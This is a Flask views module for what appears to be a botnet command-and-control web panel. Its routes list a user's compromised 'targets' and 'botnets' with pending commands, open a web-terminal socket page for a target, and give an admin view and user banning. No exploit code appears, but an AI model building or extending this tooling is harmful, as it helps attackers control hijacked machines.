# -*- coding: utf-8 -*-
"""
view.py
This module defines the routes and views for the web application.
It handles user authentication, dashboard rendering, and socket connections for web terminals.
It uses Flask for web framework, SQLAlchemy for database interactions, and Bcrypt for password hashing
and verification.

Routes:
    - '/dashboard' : Dashboard page for logged-in users, displaying targets and connection types.
    - '/socket/<target_name>' : Socket page for a specific target, requires authentication.
"""

import traceback
import bcrypt
from flask import render_template, url_for, Blueprint, request, session, flash, redirect, jsonify
from sqlalchemy.orm import sessionmaker
# from urllib.parse import unquote
# import socket
# import threading

from db.modle import SESSION_LOGIN, Targets, ApiToken, BotNet, APICommand, Users, Instruction_Detail
from db.mange_db import config, _create_engine, SESSION
# from utility.email_temp import EmailTemplate
from utility.processer import log, getlist, readFromJson, delete_data
# from utility.socket_utility import get_ip, handle_client


SessionLocal = sessionmaker(
    bind=_create_engine(),
    autocommit=False,
    autoflush=False
)

view = Blueprint(
    config.BLUEPRINT_NAME[3],
    __name__, template_folder='templates',
    static_folder='static', static_url_path=config.STATIC_URL_PATH
)
# SOCK_CLINENT = []
# # socket server
# def socket_server_manger(port: int)->None:
#     server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#     host = get_ip()
#     server.bind((host,port))
#     server.listen(5)
#     while True:
#         client, addr = server.accept()
#         log(f'[SOCKET] : new connection from {addr}')
#         SOCK_CLINENT.append(client)
#         threading.Thread(target=handle_client, args=(client,)).start()


@view.route("/dashboard")
def dashboard():
    """
    Render the dashboard page for the logged-in user.
    Displays targets associated with the user's email.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        is_login = SESSION(session['email'], 'check', session.get('session_id'))
        print(f"[DEBUG] is_login: {is_login}, email: {session['email']}, session_id: {session.get('session_id')}")
        if not is_login:
            flash("you must login first")
            return redirect(url_for("public.login"))
        _session = SessionLocal()
        try:
            email = session['email']
            print(email)
            pending_command = len(_session.query(APICommand).filter_by(email=session['email'], condition=config.STUTAS[1]).all())
            targets = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(), sp=',')
            botnet_per_targert = {}
            _targets = [] #list of (target_info, conn_type, target_name)
            total_bot = 0
            for target in targets:
                target_ = readFromJson('target-info',target[1])
                print(target_)
                botnet_info = _session.query(BotNet).filter_by(target_name=target[1]).all()
                botnet_per_targert[target[1]] = (len(botnet_info), botnet_info)
                total_bot = total_bot + len(botnet_info)
                if '127.0.0.1' in target_['ip']:
                    conn = 'local'
                elif '192.168' in target_['ip']:
                    conn = 'wifi'
                else:
                    # , mdi mdi-ethernet-cable
                    conn = 'ethernet'
                _targets.append((target_, conn, target[1]))
            botnet_per_targert['totalBot'] = total_bot
            if request.method != 'GET':
                return redirect(url_for('event.page_404'))
            return render_template('auth/dashboard.html', targets=_targets,botnet_per_targert=botnet_per_targert,pending_commands=pending_command)
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {e}\n{traceback.format_exc()}')
            print(traceback.format_exc())
            _session.rollback()
            return redirect(url_for('event.page_500'))
        finally:
            _session.close()
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))



@view.route("/socket/<target_name>")
def socket_page(target_name):
    """
    Render the socket page for a specific target.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        is_login = SESSION(session['email'], 'check', session.get('session_id'))
        if not is_login:
            flash("you must login first")
            return redirect(url_for("public.login"))
        _session = SessionLocal()
        try:
            token = getlist(_session.query(ApiToken).filter_by(user_email=session['email']).all(), sp=',')[0][1]
            targets = getlist(_session.query(Targets).filter_by(target_name=target_name).all(), sp=',')
            if len(targets) != 0 and len(token) != 0:
                return render_template('auth/socket.html', target_name=target_name,token=token)
            else:
                flash(f'No such a target {target_name}')
                return redirect(request.referrer)
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {e}\n{traceback.format_exc()}')
            _session.rollback()
            return redirect(url_for('event.page_500'))
        finally:
            _session.close()
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route("/admin")
def admin():
    if "email" not in session:
        flash("you must login first")
        return redirect(url_for("public.login"))

    if session['email'] != config.ADMIN_EMAIL:
        flash("you are not authorized to access this page")
        return redirect(url_for("view.dashboard"))

    is_login = SESSION(session['email'], 'check', session.get('session_id'))
    if not is_login:
        flash("you must login first")
        return redirect(url_for("public.login"))

    _session = SessionLocal()
    try:
        all_users = _session.query(Users).all()
        all_targets = _session.query(Targets).all()
        all_botnets = _session.query(BotNet).all()

        users_info = {}

        for user in all_users:
            user_targets = [target for target in all_targets if target.user_email == user.email]
            user_botnets = [botnet for botnet in all_botnets if botnet.user_email == user.email]
            users_info[user.email] = {
                "user": user,
                "targets": user_targets,
                "botnets": user_botnets,
                "total_targets": len(user_targets),
                "total_botnets": len(user_botnets)
            }
        return render_template(
            "auth/admin.html", 
            users_info=users_info, 
            all_users=all_users
        )
    except Exception as e:
        log(f'[ERROR ROUT] : {request.endpoint} error: {e}\n{traceback.format_exc()}')
        _session.rollback()
        return redirect(url_for('event.page_500'))
    finally:
        _session.close()

@view.route('/admin/ban_user', methods=['POST'])
def admin_ban_user():
    '''
    Ban (delete) a user account. Admin only.
    Removes the user, their API token, targets, instructions, and socket status.
    Triggered from the admin panel's "Ban User" button.
    '''
    if 'email' not in session:
        flash("you must login first")
        return redirect(url_for("public.login"))

    if session['email'] != config.ADMIN_EMAIL:
        flash("you are not authorized to access this page")
        return redirect(url_for("view.dashboard"))

    is_login = SESSION(session['email'], 'check', session.get('session_id'))
    if not is_login:
        flash("you must login first")
        return redirect(url_for("public.login"))

    _session = SessionLocal()
    try:
        if request.method == 'POST':
            banned_email = request.form.get('email', '').strip()

            if not banned_email:
                flash("no email provided. try again.")
                return redirect(url_for("view.admin"))

            if banned_email == config.ADMIN_EMAIL:
                flash("you can't ban yourself. that's not how this works.")
                return redirect(url_for("view.admin"))

            # Get the user record
            user = _session.query(Users).filter_by(email=banned_email).first()
            if not user:
                flash(f"user {banned_email} not found. maybe they were already banned.")
                return redirect(url_for("view.admin"))

            user_email = user.email

            # Get the API token (may not exist)
            token_row = _session.query(ApiToken).filter_by(user_email=user_email).first()
            token = token_row.token if token_row else None

            # Delete cached data for each target
            targets = _session.query(Targets).filter_by(user_email=user_email).all()
            for target in targets:
                delete_data("target-info", section=target.user_email)
                delete_data("code-output", section=target.target_name)
                delete_data("code-output", section=target.target_name)

            # Delete socket status if a token exists
            if token:
                delete_data("socket-stutas", section=token)

            # Delete DB rows
            _session.query(Users).filter_by(email=user_email).delete()
            _session.query(ApiToken).filter_by(user_email=user_email).delete()
            _session.query(Instruction_Detail).filter_by(userEmail=user_email).delete()
            _session.query(Targets).filter_by(user_email=user_email).delete()
            _session.commit()

            flash(f"user {banned_email} has been banned. targets and botnets wiped. no refunds.")
            return redirect(url_for("view.admin"))

        flash("invalid request method")
        return redirect(url_for("view.admin"))

    except Exception as e:
        _session.rollback()
        log(f'[ERROR ROUT] : {request.endpoint} error: {e}\n{traceback.format_exc()}')
        flash("something broke while banning. check the logs.")
        return redirect(url_for("view.admin"))
    finally:
        _session.close()

